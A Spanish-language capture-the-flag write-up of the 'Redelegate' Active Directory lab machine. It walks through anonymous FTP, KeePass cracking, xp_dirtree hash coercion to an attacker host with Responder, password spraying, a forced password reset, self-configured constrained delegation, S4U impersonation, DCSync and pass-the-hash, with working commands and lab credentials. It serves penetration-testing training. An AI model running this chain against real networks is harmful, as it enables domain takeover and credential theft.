---
title: "Redelegate (Hard)"
date: 2026-11-07
author: "Isma"
slug: "redelegate"
tags: ["Windows", "AD", "FTP", "KeePass", "Hash Cracking", "MSSQL", "NTLM Relay", "Password Spraying", "BloodHound", "ACL Abuse", "RBCD", "DCSync"]
categories: ["Machine", "CPTS Preparation"]
draft: false
source: "obsidian"
---

## Resumen

Redelegate es un controlador de dominio Windows con una cadena larga que combina varias técnicas clásicas de AD de principio a fin. Empieza con **FTP anónimo**, donde encuentro una base de datos de **KeePass** y una pista sobre la política de contraseñas de la empresa (`SeasonYear!`), que me sirve para crackear el `.kdbx` con un ataque de diccionario dirigido. Dentro hay credenciales de varios servicios, entre ellas una cuenta de **MSSQL**; desde ahí fuerzo al servidor a autenticarse contra mi máquina (`xp_dirtree`) y capturo con **Responder** el hash NetNTLMv2 de `sql_svc`, que no logro crackear. En paralelo, genero una wordlist de usuarios y hago **password spraying** con la misma política de contraseñas, lo que me da acceso como `Marie.Curie`. Por **BloodHound** veo que pertenece al grupo `HELPDESK`, que puede resetear la contraseña de `Helen.Frost`, cuyo grupo `IT` tiene **GenericAll** sobre el equipo `FS01`. Desde ahí configuro una **delegación restringida (RBCD inversa, self-configurada)** del equipo `FS01$` hacia el DC y, con **S4U2Self/S4U2Proxy**, obtengo un ticket que me permite hacer **DCSync** y comprometer el dominio entero.

## Reconocimiento

```
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| CyberAudit.txt
| Shared.kdbx
|_TrainingAgenda.txt
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
3268/tcp  open  ldap
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: REDELEGATE
|   DNS_Computer_Name: dc.redelegate.vl
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
9389/tcp  open  mc-nmf        .NET Message Framing
Service Info: Host: DC; OS: Windows
```

Es un **controlador de dominio** de `redelegate.vl`, con **FTP anónimo abierto**, lo que suele ser el punto de partida más rápido en este tipo de máquinas.

### FTP anónimo

```bash
ftp anonymous@10.129.234.50
```

```
230 User logged in.
10-20-24  01:11AM     434 CyberAudit.txt
10-20-24  05:14AM    2622 Shared.kdbx
10-20-24  01:26AM     580 TrainingAgenda.txt
```

![redelegate](/images/obsidian/redelegate/pasted-image-20260903152449.png)

Descargo los tres ficheros en **modo binario** (`binary` en el cliente FTP), imprescindible para no corromper el `.kdbx`, que es un formato binario: el modo ASCII por defecto reescribe los finales de línea y rompería la base de datos.

![redelegate](/images/obsidian/redelegate/pasted-image-20260903152637.png)

![redelegate](/images/obsidian/redelegate/pasted-image-20260903152653.png)

`CyberAudit.txt` incluye una recomendación/aviso sobre la política de contraseñas de la empresa: siguen el patrón **`Temporada` + `Año` + `!`** (por ejemplo `Fall2024!`). Con eso puedo construir un diccionario dirigido en vez de usar `rockyou.txt` a ciegas.

## Acceso Inicial (Foothold)

### Crackeo de la base de datos KeePass

Extraigo el hash de `Shared.kdbx` con `keepass2john` y lo ataco con el diccionario de temporadas + años:

```bash
keepass2john Shared.kdbx > keepass.hash
hashcat -m 13400 keepass.hash seasons_years.txt
```

```
Fall2024!   (Shared)
```

![redelegate](/images/obsidian/redelegate/pasted-image-20260903154739.png)

Abro la base de datos con **KeePassXC** y la contraseña `Fall2024!`. Dentro hay varias credenciales guardadas:

![redelegate](/images/obsidian/redelegate/pasted-image-20260903154959.png)

| Entrada | Usuario | Contraseña |
|---|---|---|
| FS01 Admin | Administrator | `Spdv41gg4BlBgSYIW1gF` |
| WEB01 | WordPress Panel | `cn4KOEgsHqvKXPjEnSD9` |
| SQL Guest | SQLGuest | `zDPBpaF4FywlqIv11vii` |

### Acceso a MSSQL

Pruebo las credenciales de `SQLGuest` contra el MSSQL del DC, y funcionan:

```bash
nxc mssql 10.129.234.50 -u SQLGuest -p zDPBpaF4FywlqIv11vii --local-auth
```

![redelegate](/images/obsidian/redelegate/pasted-image-20260903155408.png)

```bash
impacket-mssqlclient redelegate.vl/SQLGuest@10.129.234.50
```

La enumeración de la base de datos no revela nada directamente explotable (sin `xp_cmdshell`, sin datos sensibles en las tablas), así que cambio de estrategia: fuerzo al servidor SQL a autenticarse contra mi máquina.

### Captura de hash con xp_dirtree + Responder

Levanto **Responder** para capturar autenticaciones NTLM entrantes:

```bash
responder -I tun0
```

![redelegate](/images/obsidian/redelegate/pasted-image-20260903160219.png)

Desde la sesión de `impacket-mssqlclient`, uso **`xp_dirtree`** para que el propio servicio de MSSQL (que corre como la cuenta `sql_svc`) intente listar un recurso UNC en mi IP, lo que dispara una autenticación SMB hacia mí:

```sql
EXEC master..xp_dirtree '\\10.10.15.125\share\';
```

Responder captura el hash NetNTLMv2 de la cuenta de servicio:

![redelegate](/images/obsidian/redelegate/pasted-image-20260903160334.png)

```
[SMB] NTLMv2-SSP Username : REDELEGATE\sql_svc
```

Intento crackearlo con hashcat (modo 5600) contra `rockyou.txt` y contra el diccionario de temporadas, sin éxito:

![redelegate](/images/obsidian/redelegate/pasted-image-20260903161847.png)

## Movimiento Lateral

### Enumeración de usuarios y password spraying

Para no depender solo del hash, genero una lista de nombres de usuario combinando los nombres que he visto hasta ahora (en el `.kdbx`, en RPC/LDAP anónimo) en los formatos habituales (`nombre.apellido`):

![redelegate](/images/obsidian/redelegate/pasted-image-20260903162317.png)

Con esa lista de usuarios y el mismo diccionario de temporadas/años que usé para el KeePass, hago **password spraying** por SMB:

```bash
nxc smb 10.129.234.50 -u usuarios.txt -p temporadas_anos.txt --no-bruteforce --continue-on-success
```

```
[+] redelegate.vl\Marie.Curie:Fall2024!
```

![redelegate](/images/obsidian/redelegate/pasted-image-20260903162828.png)

## Escalada de Privilegios

### BloodHound: de Marie.Curie a GenericAll sobre FS01

Con credenciales de dominio, recojo datos con BloodHound y busco el camino desde `Marie.Curie` hacia Domain Admins / el DC.

`Marie.Curie` es miembro del grupo **`HELPDESK`**, que tiene **`ForceChangePassword`** sobre varios usuarios, entre ellos `Helen.Frost`:

![redelegate](/images/obsidian/redelegate/pasted-image-20260903162950.png)

A su vez, `Helen.Frost` es miembro del grupo **`IT`**, que tiene **`GenericAll`** sobre el equipo **`FS01`**:

![redelegate](/images/obsidian/redelegate/pasted-image-20260903162950.png)

### Reset de contraseña con ForceChangePassword

`ForceChangePassword` permite cambiar la contraseña de otro usuario **sin conocer la actual**. La fuerzo con BloodyAD:

```bash
bloodyAD -d redelegate.vl -u 'marie.curie' -p 'Fall2024!' --host dc.redelegate.vl set password 'HELEN.FROST' 'Password123!'
```

![redelegate](/images/obsidian/redelegate/pasted-image-20260903163631.png)

Ya puedo autenticarme como `Helen.Frost`, que hereda el `GenericAll` sobre `FS01` a través del grupo `IT`.

### Delegación restringida self-configurada (RBCD inversa)

`GenericAll` sobre un objeto equipo me deja modificar sus atributos, incluidos los que controlan la delegación Kerberos. A diferencia del RBCD clásico (donde abuso de una delegación que **ya existe** sobre la máquina objetivo), aquí tengo control total sobre `FS01`, así que puedo **montar yo mismo** una delegación restringida con protocol transition desde `FS01$` hacia el DC:

```bash
# 1. Credenciales frescas para el equipo que controlo
bloodyAD -d redelegate.vl -k --host dc.redelegate.vl set password "FS01$" 'Password1!'

# 2. Habilito protocol transition (TRUSTED_TO_AUTH_FOR_DELEGATION) para poder
#    hacer S4U2Self sin conocer la contraseña del usuario a suplantar
bloodyAD -d redelegate.vl -k --host dc.redelegate.vl add uac FS01$ -f TRUSTED_TO_AUTH_FOR_DELEGATION

# 3. Apunto la delegación directamente al servicio del DC
bloodyAD -d redelegate.vl -k --host dc.redelegate.vl set object FS01$ msDS-AllowedToDelegateTo -v 'cifs/dc.redelegate.vl'
```

![redelegate](/images/obsidian/redelegate/pasted-image-20260903172004.png)

> **A diferencia de RBCD**
> `msDS-AllowedToDelegateTo` no exige ningún consentimiento del lado del servicio destino: apunta directamente a él, sin tocar el objeto del DC. Es justo lo contrario a RBCD, donde el permiso se escribe **en el objeto de la víctima** (`msDS-AllowedToActOnBehalfOfOtherIdentity`).

### S4U2Self + S4U2Proxy y DCSync

Con la delegación configurada, pido un ticket de servicio para el DC **suplantando a la propia cuenta de máquina del DC** (`dc`), que por definición tiene permisos de replicación:

```bash
impacket-getST redelegate.vl/fs01\$:'Password1!' -spn cifs/dc.redelegate.vl -impersonate dc
```

![redelegate](/images/obsidian/redelegate/pasted-image-20260903171933.png)

```
[*] Impersonating dc
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in dc@cifs_dc.redelegate.vl@REDELEGATE.VL.ccache
```

Con el ticket cargado hago **DCSync** y extraigo todos los hashes del dominio:

```bash
export KRB5CCNAME=dc@cifs_dc.redelegate.vl@REDELEGATE.VL.ccache
impacket-secretsdump -k -no-pass -dc-ip 10.129.234.50 dc.redelegate.vl
```

![redelegate](/images/obsidian/redelegate/pasted-image-20260903171921.png)

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ec17f7a2a4d96e177bfd101b94ffc0a7:::
```

Con el hash NT de `Administrator` entro por Pass-the-Hash y capturo la **Root Flag**.

## Conclusiones

- El FTP anónimo con una base de datos de contraseñas y una pista sobre la política de la empresa reduce un ataque de fuerza bruta a un diccionario de un puñado de combinaciones.
- `xp_dirtree` contra una ruta UNC propia es una forma clásica y silenciosa de robar el hash de la cuenta de servicio de MSSQL.
- Las delegaciones (`ForceChangePassword`, `GenericAll` sobre equipos) se encadenan: cada ACL "menor" puede ser el siguiente eslabón hacia Domain Admin. BloodHound es la única forma razonable de verlo.
- `GenericAll`/`GenericWrite` sobre un objeto equipo no es solo "puedo reiniciar su contraseña": permite fabricar una delegación restringida completa, sin depender de que ya exista una mal configurada.
